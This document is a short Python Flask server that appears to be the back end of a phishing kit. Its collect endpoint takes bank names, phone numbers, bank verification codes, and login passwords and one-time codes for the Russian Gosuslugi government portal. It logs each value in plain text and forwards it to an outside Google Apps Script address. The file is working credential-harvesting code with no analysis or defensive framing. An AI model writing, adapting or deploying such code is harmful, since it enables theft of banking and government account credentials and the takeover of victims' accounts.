from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import datetime
import sys

app = Flask(__name__)
CORS(app)

GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycby8FtDx4t4akWrHitfrab9lJ_IT002a3O4LmOJjVLDPj4WFzRiHWvHwooSXdlciReh0/exec"

def log(msg):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    line = f"[{timestamp}] {msg}"
    print(line)
    sys.stdout.flush()

def log_to_google(data):
    try:
        requests.post(GOOGLE_SCRIPT_URL, json=data, timeout=10)
    except Exception as e:
        log(f"Google log error: {e}")

@app.route('/', methods=['GET'])
def home():
    log("ROOT: Server pinged")
    return jsonify({'status': 'ok', 'message': 'Server is running'})

@app.route('/api/collect', methods=['POST'])
def collect():
    data = request.json
    msg_type = data.get('type')

    log(f"=== NEW REQUEST: {msg_type} ===")

    if msg_type == 'bank_selected':
        log(f"BANK: {data.get('bankName')} ({data.get('bank')})")
        log_to_google({'type': 'bank_selected', 'bank': data.get('bank'), 'bankName': data.get('bankName')})

    elif msg_type == 'bank_phone':
        log(f"PHONE: {data.get('phone')} | BANK: {data.get('bankName')}")
        log_to_google({'type': 'bank_phone', 'phone': data.get('phone'), 'bank': data.get('bankName')})

    elif msg_type == 'bank_code':
        log(f"BANK CODE: {data.get('code')} | STATUS: {data.get('status')}")
        log_to_google({'type': 'bank_code', 'code': data.get('code'), 'status': data.get('status')})

    elif msg_type == 'gosuslugi_phone':
        log(f"GOSUSLUGI LOGIN: {data.get('phone')}")
        log(f"GOSUSLUGI PASSWORD: {data.get('password')}")
        log_to_google({'type': 'gosuslugi_login', 'phone': data.get('phone'), 'password': data.get('password')})

    elif msg_type == 'gosuslugi_code':
        log(f"GOSUSLUGI CODE: {data.get('code')} | STATUS: {data.get('status')}")
        log_to_google({'type': 'gosuslugi_code', 'code': data.get('code'), 'status': data.get('status')})

    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
